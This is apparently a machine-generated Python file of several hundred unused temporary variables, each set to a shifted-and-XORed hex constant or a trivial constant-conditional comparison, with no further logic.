tmp_m315 = (0x7056 >> 4) ^ 0x33
tmp_m353 = (0xd40 >> 4) ^ 0xed
tmp_l259 = (19 > 91) if True else (19 == 91)
tmp_l134 = (74 > 81) if False else (74 == 81)
tmp_m528 = (0x190a >> 1) ^ 0xe0
tmp_m527 = (0x98ac >> 4) ^ 0x16
tmp_l772 = (4 > 92) if True else (4 == 92)
tmp_l668 = (77 > 29) if True else (77 == 29)
tmp_l565 = (79 > 33) if True else (79 == 33)
tmp_m060 = (0x3ee2 >> 4) ^ 0x2c
tmp_l294 = (68 > 8) if True else (68 == 8)
tmp_l358 = (90 > 70) if True else (90 == 70)
tmp_l578 = (40 > 85) if False else (40 == 85)
tmp_l409 = (30 > 24) if False else (30 == 24)
tmp_m523 = (0x133a >> 1) ^ 0x6d
tmp_l070 = (11 > 16) if False else (11 == 16)
tmp_l889 = (12 > 8) if True else (12 == 8)
tmp_l887 = (56 > 6) if False else (56 == 6)
tmp_m848 = (0x7755 >> 3) ^ 0x8c
tmp_l143 = (54 > 63) if True else (54 == 63)
tmp_l731 = (63 > 23) if True else (63 == 23)
tmp_m783 = (0x76c8 >> 2) ^ 0xbf
tmp_l574 = (69 > 72) if True else (69 == 72)
tmp_l568 = (17 > 75) if False else (17 == 75)
tmp_m278 = (0xffdc >> 1) ^ 0x6f
tmp_m849 = (0x1546 >> 1) ^ 0x59
tmp_m588 = (0xad0 >> 4) ^ 0x67
tmp_m351 = (0x44fd >> 3) ^ 0x9a
tmp_m287 = (0xe4cc >> 2) ^ 0x5
tmp_m767 = (0x25c7 >> 2) ^ 0x34
tmp_l371 = (56 > 64) if True else (56 == 64)
tmp_m124 = (0x5e2c >> 3) ^ 0x80
tmp_l552 = (78 > 100) if False else (78 == 100)
tmp_l184 = (90 > 59) if True else (90 == 59)
tmp_l763 = (47 > 14) if True else (47 == 14)
tmp_m456 = (0x42e1 >> 2) ^ 0x6
tmp_l211 = (50 > 100) if True else (50 == 100)
tmp_m453 = (0x11e0 >> 2) ^ 0x5d
tmp_m780 = (0xb26e >> 4) ^ 0x69
tmp_l381 = (24 > 12) if True else (24 == 12)
tmp_m720 = (0x91f3 >> 2) ^ 0x88
tmp_m613 = (0x5ec0 >> 4) ^ 0x6e
tmp_l284 = (43 > 45) if False else (43 == 45)
tmp_l817 = (43 > 56) if False else (43 == 56)
tmp_m159 = (0x425d >> 4) ^ 0xf3
tmp_m547 = (0x729a >> 2) ^ 0x5a
tmp_l551 = (91 > 61) if False else (91 == 61)
tmp_m614 = (0x9c8a >> 4) ^ 0x7
tmp_m619 = (0x7751 >> 4) ^ 0x63
tmp_l146 = (49 > 29) if False else (49 == 29)
tmp_m770 = (0xdf11 >> 3) ^ 0x5b
tmp_l588 = (63 > 81) if False else (63 == 81)
tmp_l000 = (73 > 43) if True else (73 == 43)
tmp_m777 = (0x2e6c >> 3) ^ 0x9f
tmp_m723 = (0x5ed4 >> 3) ^ 0xd4
tmp_m755 = (0xf5ec >> 4) ^ 0x86
tmp_l129 = (100 > 15) if True else (100 == 15)
tmp_m192 = (0x5834 >> 3) ^ 0x68
tmp_l320 = (61 > 97) if False else (61 == 97)
tmp_m793 = (0x26ea >> 3) ^ 0xa3
tmp_m335 = (0xca03 >> 3) ^ 0x52
tmp_l586 = (33 > 29) if True else (33 == 29)
tmp_l682 = (98 > 63) if False else (98 == 63)
tmp_l871 = (33 > 54) if False else (33 == 54)
tmp_m882 = (0xa6dc >> 1) ^ 0xbd
tmp_l717 = (95 > 15) if True else (95 == 15)
tmp_m458 = (0xecd9 >> 4) ^ 0x96
tmp_l027 = (50 > 35) if False else (50 == 35)
tmp_l671 = (75 > 21) if True else (75 == 21)
tmp_m457 = (0x5c37 >> 3) ^ 0x1b
tmp_m078 = (0xfaca >> 1) ^ 0x1c
tmp_l397 = (100 > 45) if True else (100 == 45)
tmp_l615 = (28 > 45) if True else (28 == 45)
tmp_l625 = (96 > 62) if True else (96 == 62)
tmp_l094 = (17 > 52) if False else (17 == 52)
tmp_m099 = (0x9bec >> 4) ^ 0x51
tmp_l843 = (74 > 71) if False else (74 == 71)
tmp_m583 = (0x1665 >> 1) ^ 0x5d
tmp_l295 = (55 > 82) if False else (55 == 82)
tmp_l432 = (60 > 42) if True else (60 == 42)
tmp_l743 = (10 > 40) if True else (10 == 40)
tmp_l686 = (75 > 73) if False else (75 == 73)
tmp_l226 = (83 > 40) if True else (83 == 40)
tmp_m795 = (0xdf52 >> 2) ^ 0xae
tmp_l247 = (11 > 49) if True else (11 == 49)
tmp_m825 = (0xd718 >> 4) ^ 0x30
tmp_m342 = (0xe21b >> 2) ^ 0x94
tmp_m772 = (0xaa27 >> 4) ^ 0xa5
tmp_m100 = (0x45b0 >> 3) ^ 0x54
tmp_l726 = (82 > 92) if True else (82 == 92)
tmp_m016 = (0xd1d8 >> 4) ^ 0x5c
tmp_l378 = (4 > 97) if False else (4 == 97)
tmp_m125 = (0xc8a7 >> 2) ^ 0x8f
tmp_l015 = (12 > 97) if False else (12 == 97)
tmp_l658 = (63 > 19) if True else (63 == 19)
tmp_l232 = (44 > 75) if True else (44 == 75)
tmp_l782 = (4 > 85) if False else (4 == 85)
tmp_l079 = (19 > 3) if True else (19 == 3)
tmp_l745 = (49 > 42) if False else (49 == 42)
tmp_m308 = (0x19b8 >> 1) ^ 0x2b
tmp_m286 = (0xd31b >> 4) ^ 0x2
tmp_m184 = (0xa78f >> 1) ^ 0xa7
tmp_m027 = (0xe4fb >> 3) ^ 0xc6
tmp_l447 = (90 > 35) if False else (90 == 35)
tmp_m314 = (0x2342 >> 1) ^ 0x6c
tmp_l193 = (75 > 36) if False else (75 == 36)
tmp_l561 = (32 > 12) if True else (32 == 12)
tmp_m289 = (0x914b >> 2) ^ 0x5c
tmp_l798 = (63 > 47) if False else (63 == 47)
tmp_l516 = (88 > 38) if False else (88 == 38)
tmp_m471 = (0xdd5b >> 1) ^ 0x3c
tmp_m684 = (0xf7a >> 4) ^ 0x2f
tmp_l197 = (15 > 90) if False else (15 == 90)
tmp_l756 = (25 > 56) if False else (25 == 56)
tmp_m267 = (0xcabd >> 2) ^ 0xa7
tmp_l701 = (67 > 47) if False else (67 == 47)
tmp_l820 = (35 > 64) if True else (35 == 64)
tmp_m243 = (0x1237 >> 4) ^ 0xa7
tmp_l895 = (59 > 21) if True else (59 == 21)
tmp_l281 = (49 > 57) if True else (49 == 57)
tmp_m597 = (0x3155 >> 4) ^ 0xc2
tmp_l564 = (66 > 39) if True else (66 == 39)
tmp_l676 = (35 > 91) if True else (35 == 91)
tmp_l217 = (36 > 30) if True else (36 == 30)
tmp_l061 = (51 > 49) if False else (51 == 49)
tmp_l063 = (19 > 80) if False else (19 == 80)
tmp_m079 = (0x77de >> 1) ^ 0x20
tmp_m590 = (0xeddc >> 1) ^ 0xf9
tmp_m737 = (0x5a69 >> 1) ^ 0x2c
tmp_m143 = (0x243b >> 2) ^ 0x96
tmp_l836 = (99 > 40) if False else (99 == 40)
tmp_m465 = (0x5c83 >> 3) ^ 0xca
tmp_m671 = (0x938d >> 2) ^ 0xaa
tmp_m893 = (0xfa7e >> 2) ^ 0x73
tmp_m797 = (0xc638 >> 4) ^ 0xa2
tmp_m150 = (0x7cdf >> 4) ^ 0x90
tmp_l056 = (11 > 25) if True else (11 == 25)
tmp_l696 = (63 > 36) if True else (63 == 36)
tmp_l751 = (2 > 30) if True else (2 == 30)
tmp_l510 = (74 > 20) if False else (74 == 20)
tmp_l433 = (42 > 7) if False else (42 == 7)
tmp_l537 = (88 > 10) if True else (88 == 10)
tmp_l662 = (74 > 14) if True else (74 == 14)
tmp_m733 = (0x1875 >> 3) ^ 0xe2
tmp_l853 = (92 > 56) if True else (92 == 56)
tmp_l352 = (32 > 30) if False else (32 == 30)
tmp_l007 = (79 > 74) if True else (79 == 74)
tmp_l014 = (54 > 40) if True else (54 == 40)
tmp_m730 = (0xa3eb >> 4) ^ 0xe
tmp_l866 = (19 > 30) if True else (19 == 30)
tmp_m492 = (0x362e >> 3) ^ 0x21
tmp_l398 = (24 > 37) if False else (24 == 37)
tmp_m254 = (0x337 >> 2) ^ 0xb7
tmp_l738 = (25 > 99) if True else (25 == 99)
tmp_m685 = (0x65ad >> 4) ^ 0x5f
tmp_l095 = (36 > 78) if False else (36 == 78)
tmp_m861 = (0x5383 >> 3) ^ 0xbf
tmp_m571 = (0xe1c8 >> 4) ^ 0x18
tmp_l245 = (86 > 35) if False else (86 == 35)
tmp_l899 = (56 > 56) if True else (56 == 56)
tmp_l368 = (99 > 91) if False else (99 == 91)
tmp_m873 = (0xa701 >> 3) ^ 0x53
tmp_m248 = (0xcb16 >> 3) ^ 0x5b
tmp_l308 = (82 > 32) if True else (82 == 32)
tmp_l220 = (95 > 15) if False else (95 == 15)
tmp_l529 = (18 > 56) if False else (18 == 56)
tmp_m419 = (0xb4f1 >> 4) ^ 0x28
tmp_l425 = (56 > 78) if False else (56 == 78)
tmp_l715 = (44 > 7) if True else (44 == 7)
tmp_m765 = (0x3a98 >> 3) ^ 0x69
tmp_m414 = (0x15cc >> 1) ^ 0xc8
tmp_m640 = (0x5931 >> 3) ^ 0x6e
tmp_l795 = (38 > 100) if True else (38 == 100)
tmp_m380 = (0x34b2 >> 2) ^ 0x3e
tmp_l024 = (63 > 94) if False else (63 == 94)
tmp_m672 = (0xc7c9 >> 2) ^ 0x3a
tmp_m438 = (0x91cd >> 1) ^ 0xd
tmp_l734 = (57 > 28) if True else (57 == 28)
tmp_m000 = (0x6006 >> 4) ^ 0x92
tmp_l141 = (87 > 1) if True else (87 == 1)
tmp_l768 = (27 > 76) if False else (27 == 76)
tmp_m713 = (0x6769 >> 4) ^ 0x7a
tmp_m596 = (0xf72d >> 4) ^ 0x71
tmp_m262 = (0xac71 >> 4) ^ 0x8f
tmp_l394 = (22 > 3) if True else (22 == 3)
tmp_l683 = (35 > 56) if True else (35 == 56)
tmp_m303 = (0x2991 >> 2) ^ 0x26
tmp_l475 = (53 > 53) if True else (53 == 53)
tmp_m697 = (0xe4a5 >> 1) ^ 0x26
tmp_m542 = (0x4baa >> 1) ^ 0x7c
tmp_l712 = (36 > 80) if True else (36 == 80)
tmp_m808 = (0xefbd >> 4) ^ 0x83
tmp_m119 = (0xc6c9 >> 1) ^ 0x3f
tmp_m669 = (0x7541 >> 2) ^ 0xeb
tmp_m015 = (0xf8b8 >> 1) ^ 0x42
tmp_m282 = (0xa7f1 >> 1) ^ 0x82
tmp_m293 = (0x4bd5 >> 4) ^ 0xd
tmp_m185 = (0x12f9 >> 1) ^ 0xeb
tmp_m352 = (0x8a9c >> 4) ^ 0x82
tmp_m117 = (0xd4a4 >> 1) ^ 0x14
tmp_l255 = (74 > 15) if False else (74 == 15)
tmp_l410 = (19 > 3) if True else (19 == 3)
tmp_l467 = (70 > 75) if False else (70 == 75)
tmp_l584 = (92 > 37) if False else (92 == 37)
tmp_l856 = (89 > 75) if False else (89 == 75)
tmp_l654 = (30 > 2) if True else (30 == 2)
tmp_l892 = (70 > 69) if True else (70 == 69)
tmp_l001 = (71 > 16) if False else (71 == 16)
tmp_m363 = (0x4e0b >> 4) ^ 0xb8
tmp_l137 = (4 > 36) if True else (4 == 36)
tmp_l187 = (95 > 9) if True else (95 == 9)
tmp_l781 = (97 > 15) if False else (97 == 15)
tmp_m331 = (0xd582 >> 4) ^ 0x2d
tmp_m036 = (0x4214 >> 4) ^ 0xac
tmp_l824 = (36 > 36) if False else (36 == 36)
tmp_m648 = (0xd53d >> 1) ^ 0xe4
tmp_l224 = (41 > 20) if True else (41 == 20)
tmp_l101 = (18 > 9) if False else (18 == 9)
tmp_l408 = (94 > 80) if False else (94 == 80)
tmp_m622 = (0x2e4d >> 3) ^ 0x78
tmp_l811 = (46 > 81) if True else (46 == 81)
tmp_l416 = (98 > 11) if False else (98 == 11)
tmp_l863 = (39 > 85) if False else (39 == 85)
tmp_l246 = (35 > 29) if True else (35 == 29)
tmp_m080 = (0x892d >> 4) ^ 0xdd
tmp_l122 = (24 > 76) if True else (24 == 76)
tmp_m070 = (0x10f >> 2) ^ 0x3b
tmp_m644 = (0x1470 >> 3) ^ 0x57
tmp_m140 = (0xc63a >> 3) ^ 0x6d
tmp_m736 = (0x491e >> 2) ^ 0xdb
tmp_m687 = (0x5f3b >> 1) ^ 0x20
tmp_m725 = (0x1b7b >> 2) ^ 0x32
tmp_l799 = (37 > 73) if True else (37 == 73)
tmp_m063 = (0x6a78 >> 1) ^ 0xb6
tmp_l867 = (21 > 70) if True else (21 == 70)
tmp_l660 = (84 > 72) if True else (84 == 72)
tmp_m095 = (0xb654 >> 3) ^ 0x56
tmp_m448 = (0xcfc2 >> 4) ^ 0x1
tmp_l179 = (66 > 49) if True else (66 == 49)
tmp_m480 = (0x6998 >> 3) ^ 0x41
tmp_m002 = (0x308d >> 1) ^ 0x6e
tmp_m876 = (0x5cc7 >> 4) ^ 0xb2
tmp_l250 = (92 > 71) if False else (92 == 71)
tmp_l006 = (64 > 2) if True else (64 == 2)
tmp_m120 = (0xae68 >> 4) ^ 0x48
tmp_l396 = (76 > 73) if True else (76 == 73)
tmp_l180 = (51 > 89) if True else (51 == 89)
tmp_m086 = (0xf6fa >> 4) ^ 0x48
tmp_m564 = (0x7ed6 >> 1) ^ 0xd7
tmp_l604 = (31 > 39) if True else (31 == 39)
tmp_m760 = (0x78bd >> 1) ^ 0xe4
tmp_l362 = (97 > 81) if False else (97 == 81)
tmp_m039 = (0xa9be >> 4) ^ 0x37
tmp_l243 = (20 > 83) if True else (20 == 83)
tmp_m361 = (0x3a12 >> 2) ^ 0x88
tmp_m129 = (0x44df >> 4) ^ 0xab
tmp_m367 = (0x7c5b >> 4) ^ 0xff
tmp_m136 = (0x1c93 >> 3) ^ 0x29
tmp_l530 = (68 > 96) if True else (68 == 96)
tmp_l474 = (82 > 84) if False else (82 == 84)
tmp_m133 = (0xec0b >> 4) ^ 0xfc
tmp_m138 = (0xdc5b >> 3) ^ 0x81
tmp_m679 = (0x7b3f >> 4) ^ 0x3
tmp_l898 = (67 > 69) if True else (67 == 69)
tmp_m494 = (0xc83 >> 3) ^ 0xec
tmp_m538 = (0x7922 >> 2) ^ 0x49
tmp_l341 = (89 > 44) if True else (89 == 44)
tmp_l170 = (30 > 35) if True else (30 == 35)
tmp_l269 = (84 > 77) if True else (84 == 77)
tmp_m858 = (0x18d0 >> 2) ^ 0x47
tmp_l083 = (78 > 88) if False else (78 == 88)
tmp_m180 = (0xb3c5 >> 3) ^ 0x99
tmp_m705 = (0xe132 >> 3) ^ 0xe8
tmp_m098 = (0x3eb7 >> 3) ^ 0xad
tmp_l285 = (56 > 52) if True else (56 == 52)
tmp_m373 = (0x9218 >> 4) ^ 0x66
tmp_m121 = (0x9059 >> 4) ^ 0xe8
tmp_m181 = (0x2d7 >> 3) ^ 0x89
tmp_m350 = (0x1d10 >> 4) ^ 0xba
tmp_m389 = (0x79f5 >> 3) ^ 0x8e
tmp_m884 = (0xd289 >> 1) ^ 0x18
tmp_m310 = (0x87fd >> 4) ^ 0x1
tmp_m487 = (0xfc0d >> 4) ^ 0x37
tmp_m066 = (0x7b40 >> 2) ^ 0xc8
tmp_l175 = (21 > 94) if True else (21 == 94)
tmp_l081 = (50 > 72) if False else (50 == 72)
tmp_m513 = (0xb62c >> 2) ^ 0xda
tmp_l106 = (40 > 24) if False else (40 == 24)
tmp_l165 = (10 > 23) if True else (10 == 23)
tmp_l752 = (99 > 12) if False else (99 == 12)
tmp_m312 = (0xc8c5 >> 4) ^ 0x4
tmp_m112 = (0xf85c >> 3) ^ 0x6f
tmp_l435 = (4 > 68) if False else (4 == 68)
tmp_m251 = (0xc6be >> 2) ^ 0x7b
tmp_l393 = (74 > 62) if False else (74 == 62)
tmp_m208 = (0x4854 >> 4) ^ 0x44
tmp_l497 = (40 > 88) if False else (40 == 88)
tmp_l704 = (80 > 23) if True else (80 == 23)
tmp_m763 = (0x3ef1 >> 2) ^ 0x47
tmp_m388 = (0xeedc >> 1) ^ 0x29
tmp_m429 = (0xb8fc >> 1) ^ 0xd0
tmp_l236 = (69 > 80) if False else (69 == 80)
tmp_m847 = (0x1670 >> 1) ^ 0x67
tmp_l508 = (86 > 52) if False else (86 == 52)
tmp_l182 = (100 > 38) if True else (100 == 38)
tmp_l600 = (33 > 96) if True else (33 == 96)
tmp_l154 = (36 > 29) if False else (36 == 29)
tmp_l727 = (89 > 8) if False else (89 == 8)
tmp_m855 = (0xe6a4 >> 2) ^ 0x18
tmp_l502 = (55 > 62) if True else (55 == 62)
tmp_m116 = (0x4efa >> 1) ^ 0x3f
tmp_m230 = (0xd50d >> 3) ^ 0xf1
tmp_l591 = (17 > 81) if False else (17 == 81)
tmp_m605 = (0xa7d3 >> 3) ^ 0x22
tmp_m321 = (0x1c9d >> 1) ^ 0xf9
tmp_l233 = (35 > 92) if False else (35 == 92)
tmp_l327 = (45 > 1) if False else (45 == 1)
tmp_l029 = (48 > 94) if False else (48 == 94)
tmp_m576 = (0x9562 >> 1) ^ 0x89
tmp_m511 = (0xf8d4 >> 4) ^ 0x35
tmp_m561 = (0xedf4 >> 3) ^ 0x16
tmp_l214 = (64 > 57) if False else (64 == 57)
tmp_l612 = (95 > 52) if False else (95 == 52)
tmp_m656 = (0x7cc7 >> 4) ^ 0xe2
tmp_l350 = (40 > 9) if True else (40 == 9)
tmp_m889 = (0xb9f0 >> 1) ^ 0xe8
tmp_m569 = (0xe4a >> 3) ^ 0x3a
tmp_l089 = (54 > 9) if True else (54 == 9)
tmp_m603 = (0x92bc >> 1) ^ 0xc3
tmp_l131 = (56 > 91) if False else (56 == 91)
tmp_l693 = (3 > 100) if True else (3 == 100)
tmp_l166 = (67 > 96) if False else (67 == 96)
tmp_l644 = (97 > 90) if True else (97 == 90)
tmp_l041 = (66 > 65) if True else (66 == 65)
tmp_m594 = (0xa433 >> 1) ^ 0xb7
tmp_l428 = (85 > 96) if False else (85 == 96)
tmp_m738 = (0xbfe2 >> 4) ^ 0x5a
tmp_l036 = (29 > 8) if True else (29 == 8)
tmp_m886 = (0xb5d3 >> 3) ^ 0x84
tmp_l364 = (41 > 36) if True else (41 == 36)
tmp_l494 = (82 > 68) if False else (82 == 68)
tmp_l113 = (43 > 75) if True else (43 == 75)
tmp_m633 = (0xea6f >> 3) ^ 0xf2
tmp_m753 = (0x4779 >> 4) ^ 0xfc
tmp_m792 = (0xea13 >> 4) ^ 0xa6
tmp_l468 = (17 > 26) if False else (17 == 26)
tmp_l744 = (33 > 8) if False else (33 == 8)
tmp_m391 = (0x5a53 >> 4) ^ 0xc1
tmp_m168 = (0xf488 >> 2) ^ 0xc7
tmp_l755 = (63 > 74) if False else (63 == 74)
tmp_l313 = (57 > 79) if True else (57 == 79)
tmp_l471 = (17 > 94) if True else (17 == 94)
tmp_m475 = (0x2f7d >> 2) ^ 0x35
tmp_l789 = (27 > 9) if True else (27 == 9)
tmp_l666 = (81 > 57) if True else (81 == 57)
tmp_l091 = (69 > 44) if False else (69 == 44)
tmp_m683 = (0xd45b >> 4) ^ 0x48
tmp_m548 = (0x7040 >> 2) ^ 0xba
tmp_m142 = (0xf00f >> 1) ^ 0x6b
tmp_l353 = (17 > 79) if False else (17 == 79)
tmp_m330 = (0x1105 >> 4) ^ 0x13
tmp_l829 = (75 > 94) if True else (75 == 94)
tmp_l846 = (11 > 88) if False else (11 == 88)
tmp_l144 = (58 > 22) if False else (58 == 22)
tmp_l815 = (68 > 15) if False else (68 == 15)
tmp_m503 = (0x11bc >> 2) ^ 0xed
tmp_l185 = (5 > 33) if True else (5 == 33)
tmp_l539 = (64 > 25) if True else (64 == 25)
tmp_m646 = (0xfafe >> 4) ^ 0x82
tmp_m341 = (0xc83 >> 3) ^ 0x38
tmp_l331 = (41 > 58) if True else (41 == 58)
tmp_l685 = (66 > 97) if True else (66 == 97)
tmp_m833 = (0xa45 >> 2) ^ 0xfc
tmp_m539 = (0x71d1 >> 2) ^ 0x40
tmp_m836 = (0xbb35 >> 3) ^ 0x96
tmp_l328 = (69 > 15) if False else (69 == 15)
tmp_m691 = (0x15f8 >> 4) ^ 0x25
tmp_l274 = (38 > 15) if False else (38 == 15)
tmp_m549 = (0xa290 >> 1) ^ 0x18
tmp_m043 = (0xa5d5 >> 2) ^ 0x4f
tmp_l633 = (96 > 70) if True else (96 == 70)
tmp_l219 = (5 > 21) if True else (5 == 21)
tmp_m807 = (0xf77d >> 3) ^ 0xb9
tmp_l373 = (61 > 11) if False else (61 == 11)
tmp_l617 = (77 > 36) if False else (77 == 36)
tmp_m851 = (0xb0fe >> 4) ^ 0xbd
tmp_l675 = (72 > 40) if True else (72 == 40)
tmp_m111 = (0x49b0 >> 3) ^ 0xa
tmp_l470 = (23 > 76) if True else (23 == 76)
tmp_l297 = (34 > 38) if False else (34 == 38)
tmp_l310 = (65 > 4) if True else (65 == 4)
tmp_l531 = (37 > 85) if True else (37 == 85)
tmp_l766 = (89 > 26) if False else (89 == 26)
tmp_l293 = (40 > 25) if True else (40 == 25)
tmp_l869 = (50 > 53) if True else (50 == 53)
tmp_m198 = (0x8fb4 >> 3) ^ 0x4c
tmp_l057 = (23 > 72) if True else (23 == 72)
tmp_l451 = (40 > 12) if False else (40 == 12)
tmp_m304 = (0xe73c >> 2) ^ 0x8
tmp_m137 = (0x8726 >> 4) ^ 0x9d
tmp_l759 = (99 > 65) if True else (99 == 65)
tmp_m749 = (0xbddf >> 4) ^ 0xc7
tmp_l834 = (95 > 100) if True else (95 == 100)
tmp_m473 = (0x4a8c >> 1) ^ 0x21
tmp_m474 = (0xe20c >> 1) ^ 0x35
tmp_m690 = (0x7db4 >> 4) ^ 0xb
tmp_l333 = (81 > 92) if False else (81 == 92)
tmp_l388 = (67 > 16) if False else (67 == 16)
tmp_m617 = (0x5b10 >> 4) ^ 0x65
tmp_m544 = (0x9a27 >> 4) ^ 0x8f
tmp_m206 = (0x4f32 >> 2) ^ 0xe2
tmp_m031 = (0x936f >> 1) ^ 0x91
tmp_m707 = (0xcbe0 >> 1) ^ 0x18
tmp_m288 = (0x2cbc >> 1) ^ 0x5c
tmp_m275 = (0x380 >> 2) ^ 0xf4
tmp_l346 = (44 > 86) if True else (44 == 86)
tmp_l479 = (88 > 18) if True else (88 == 18)
tmp_l509 = (39 > 33) if False else (39 == 33)
tmp_m896 = (0x771 >> 4) ^ 0x7a
tmp_l783 = (75 > 4) if False else (75 == 4)
tmp_m756 = (0x6a19 >> 1) ^ 0x3d
tmp_l874 = (26 > 57) if False else (26 == 57)
tmp_m197 = (0x7280 >> 2) ^ 0xf
tmp_l325 = (80 > 46) if False else (80 == 46)
tmp_l105 = (4 > 28) if True else (4 == 28)
tmp_l338 = (85 > 26) if False else (85 == 26)
tmp_m545 = (0x4747 >> 2) ^ 0x23
tmp_m329 = (0x646b >> 4) ^ 0xb3
tmp_l277 = (36 > 22) if False else (36 == 22)
tmp_l375 = (63 > 50) if True else (63 == 50)
tmp_m823 = (0x6d0d >> 3) ^ 0x40
tmp_l528 = (14 > 44) if False else (14 == 44)
tmp_l190 = (90 > 68) if True else (90 == 68)
tmp_m759 = (0x29b8 >> 1) ^ 0x9b
tmp_l486 = (19 > 44) if True else (19 == 44)
tmp_l563 = (7 > 62) if True else (7 == 62)
tmp_m245 = (0x7f9c >> 1) ^ 0xf7
tmp_l265 = (56 > 16) if False else (56 == 16)
tmp_l893 = (90 > 78) if False else (90 == 78)
tmp_l514 = (27 > 58) if True else (27 == 58)
tmp_l292 = (85 > 47) if True else (85 == 47)
tmp_m386 = (0x9862 >> 2) ^ 0xcf
tmp_m440 = (0x6b9c >> 1) ^ 0x28
tmp_l870 = (27 > 79) if False else (27 == 79)
tmp_m853 = (0x146c >> 1) ^ 0xcc
tmp_l055 = (74 > 77) if False else (74 == 77)
tmp_m620 = (0x62e8 >> 3) ^ 0x6f
tmp_l722 = (56 > 27) if True else (56 == 27)
tmp_l133 = (97 > 60) if True else (97 == 60)
tmp_l400 = (1 > 25) if True else (1 == 25)
tmp_m163 = (0xff08 >> 3) ^ 0x60
tmp_l608 = (61 > 77) if True else (61 == 77)
tmp_l453 = (52 > 24) if False else (52 == 24)
tmp_m285 = (0x2e73 >> 3) ^ 0xa1
tmp_l323 = (74 > 26) if True else (74 == 26)
tmp_m813 = (0x1687 >> 4) ^ 0x84
tmp_m829 = (0x5f55 >> 1) ^ 0x9
tmp_l607 = (63 > 52) if False else (63 == 52)
tmp_m694 = (0xf107 >> 1) ^ 0xf3
tmp_l203 = (75 > 77) if False else (75 == 77)
tmp_m084 = (0xd6ce >> 2) ^ 0x35
tmp_m602 = (0x84ad >> 4) ^ 0x18
tmp_m831 = (0x7244 >> 3) ^ 0xb1
tmp_m721 = (0x9fb2 >> 3) ^ 0x8b
tmp_m274 = (0xd63f >> 3) ^ 0x27
tmp_m213 = (0xe03e >> 4) ^ 0x5b
tmp_m088 = (0x9483 >> 3) ^ 0xf9
tmp_m390 = (0x5cd9 >> 3) ^ 0xe0
tmp_l771 = (55 > 84) if False else (55 == 84)
tmp_m375 = (0xf170 >> 1) ^ 0x4a
tmp_m271 = (0x3555 >> 1) ^ 0x94
tmp_l700 = (55 > 48) if False else (55 == 48)
tmp_m601 = (0xac80 >> 3) ^ 0x81
tmp_m812 = (0xa76d >> 3) ^ 0x21
tmp_m854 = (0x33a4 >> 3) ^ 0x4b
tmp_l619 = (60 > 9) if True else (60 == 9)
tmp_l754 = (9 > 73) if False else (9 == 73)
tmp_m743 = (0x3312 >> 4) ^ 0xcd
tmp_l634 = (88 > 50) if False else (88 == 50)
tmp_m879 = (0xaaaf >> 2) ^ 0x56
tmp_l430 = (27 > 52) if False else (27 == 52)
tmp_l168 = (58 > 82) if True else (58 == 82)
tmp_l201 = (16 > 11) if True else (16 == 11)
tmp_l632 = (70 > 19) if False else (70 == 19)
tmp_m171 = (0x39e6 >> 2) ^ 0x33
tmp_m818 = (0x4b84 >> 4) ^ 0xad
tmp_m498 = (0xa789 >> 4) ^ 0xa6
tmp_l505 = (35 > 5) if True else (35 == 5)
tmp_m852 = (0x67b0 >> 1) ^ 0x6f
tmp_m462 = (0x84c1 >> 3) ^ 0x42
tmp_m585 = (0x6fb4 >> 4) ^ 0x6d
tmp_m584 = (0xfb8f >> 1) ^ 0xf7
tmp_l199 = (89 > 96) if False else (89 == 96)
tmp_l357 = (91 > 26) if True else (91 == 26)
tmp_m510 = (0x8103 >> 2) ^ 0xd9
tmp_m074 = (0x68d6 >> 4) ^ 0x78
tmp_m499 = (0xb776 >> 1) ^ 0xc2
tmp_m643 = (0x58b1 >> 1) ^ 0xba
tmp_l067 = (9 > 17) if False else (9 == 17)
tmp_l262 = (84 > 88) if False else (84 == 88)
tmp_l541 = (61 > 68) if False else (61 == 68)
tmp_l837 = (57 > 68) if False else (57 == 68)
tmp_l557 = (74 > 77) if False else (74 == 77)
tmp_l825 = (46 > 99) if False else (46 == 99)
tmp_l818 = (40 > 31) if True else (40 == 31)
tmp_m041 = (0xc3d8 >> 1) ^ 0xd1
tmp_m880 = (0xa3b3 >> 1) ^ 0xa7
tmp_m273 = (0xeee0 >> 4) ^ 0xda
tmp_l053 = (32 > 62) if False else (32 == 62)
tmp_m843 = (0x16e1 >> 3) ^ 0xdc
tmp_m715 = (0x56f8 >> 2) ^ 0x78
tmp_l638 = (52 > 42) if False else (52 == 42)
tmp_m431 = (0xd1cf >> 2) ^ 0x95
tmp_l623 = (28 > 10) if False else (28 == 10)
tmp_m678 = (0xc460 >> 1) ^ 0xed
tmp_m611 = (0x83ba >> 4) ^ 0xc6
tmp_l021 = (37 > 5) if False else (37 == 5)
tmp_m719 = (0x1ad0 >> 3) ^ 0xc8
tmp_m890 = (0xbd2 >> 1) ^ 0xb4
tmp_m557 = (0xd7a7 >> 4) ^ 0xb2
tmp_m169 = (0x2908 >> 1) ^ 0xf9
tmp_m170 = (0x327d >> 2) ^ 0x41
tmp_l484 = (91 > 71) if False else (91 == 71)
tmp_l340 = (18 > 66) if True else (18 == 66)
tmp_l317 = (20 > 45) if True else (20 == 45)
tmp_l741 = (95 > 34) if True else (95 == 34)
tmp_l884 = (75 > 34) if True else (75 == 34)
tmp_l228 = (32 > 2) if True else (32 == 2)
tmp_l153 = (40 > 69) if True else (40 == 69)
tmp_l780 = (10 > 83) if False else (10 == 83)
tmp_l017 = (72 > 12) if False else (72 == 12)
tmp_m519 = (0xfa5b >> 4) ^ 0x96
tmp_m649 = (0xb57 >> 4) ^ 0xe
tmp_m630 = (0x470b >> 4) ^ 0x19
tmp_l319 = (10 > 51) if True else (10 == 51)
tmp_l649 = (49 > 65) if False else (49 == 65)
tmp_l324 = (93 > 58) if True else (93 == 58)
tmp_l718 = (90 > 97) if False else (90 == 97)
tmp_l034 = (78 > 11) if False else (78 == 11)
tmp_m782 = (0xd486 >> 2) ^ 0x1f
tmp_l643 = (27 > 5) if False else (27 == 5)
tmp_l330 = (5 > 68) if False else (5 == 68)
tmp_l198 = (13 > 44) if False else (13 == 44)
tmp_m785 = (0xba32 >> 2) ^ 0x1c
tmp_l344 = (10 > 39) if True else (10 == 39)
tmp_m379 = (0xcb45 >> 3) ^ 0xe1
tmp_l417 = (47 > 100) if True else (47 == 100)
tmp_m762 = (0x26b9 >> 1) ^ 0x3e
tmp_l177 = (88 > 45) if True else (88 == 45)
tmp_m272 = (0x172 >> 2) ^ 0x49
tmp_m718 = (0x8534 >> 1) ^ 0x50
tmp_m404 = (0x7c8a >> 2) ^ 0xae
tmp_l839 = (27 > 14) if True else (27 == 14)
tmp_l876 = (81 > 47) if True else (81 == 47)
tmp_l316 = (12 > 35) if True else (12 == 35)
